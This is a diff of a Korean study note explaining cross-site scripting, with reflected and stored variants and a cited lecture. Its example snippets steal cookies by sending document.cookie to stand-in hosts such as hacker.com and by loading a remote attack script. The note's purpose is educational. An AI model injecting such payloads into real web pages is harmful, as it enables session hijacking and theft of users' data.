@@ -16,26 +16,23 @@ JavaScript의 취약성을 이용한 공격
 - Javascript 소개
   - 웹 페이지의 동적 기능 구현을 담당
   - 작성 예시
-  ```{javascript}
-  <!-- 사용자 컴퓨터에 저장된 쿠키 정보 취득 -->
-  <script>
-    alert('공격이 시작됩니다^^')
-    document.loaction = 'http://hacker.com/cookie?' + document.cookie
-  <script>
-  
-  <!-- 웹 브라우저를 실행하면 자동으로 악성 코드를 실행 -->
-  <script src='http://hacker.com/attack.js?'><script>
+
   ```
-- 
+    <!-- 사용자 컴퓨터에 저장된 쿠키 정보 취득 -->
+    <script>
+      alert('공격이 시작됩니다^^')
+      document.loaction = 'http://hacker.com/cookie?' + document.cookie
+    <script>
+
+    <!-- 웹 브라우저를 실행하면 자동으로 악성 코드를 실행 -->
+    <script src='http://hacker.com/attack.js?'><script>
+  ```
 
 ## Reflcted XSS
+
 <img src='../imgs/XSS_reflected_scenario_06.png' width='500px'>
 
-
 이미지 출처: [[화이트해커][웹모의해킹] 49강. 크로스사이트스크립팅(XSS) 공격이란?](https://youtu.be/jvS45jdz1ao)
-
-[Reflected XSS](imgs/XSS_reflected_scenario_06.png)
-
 
 ## Stored XSS
 
@@ -43,7 +40,7 @@ JavaScript의 취약성을 이용한 공격
 
 예를 들면 게시판에 다음과 같은 JavaScript를 남겨 놓을 수 있습니다.
 
-```{javascript}
+```
 <script>
     let xmlHttp = new XMLHttpRequest();
     const url = "http://haker.com?victimCookie=" + document.cookie;
@@ -61,7 +58,8 @@ JavaScript의 취약성을 이용한 공격
 이미지 출처: [[화이트해커][웹모의해킹] 49강. 크로스사이트스크립팅(XSS) 공격이란?](https://youtu.be/jvS45jdz1ao)
 
 
-# References
+## References
+
 |Title|Author|Source|Link|
 |:--|:--|:--|:--|
 |[화이트해커][웹모의해킹] 49강. 크로스사이트스크립팅(XSS) 공격이란?|버그잡는 해커|Youtube|[link](https://youtu.be/jvS45jdz1ao)|
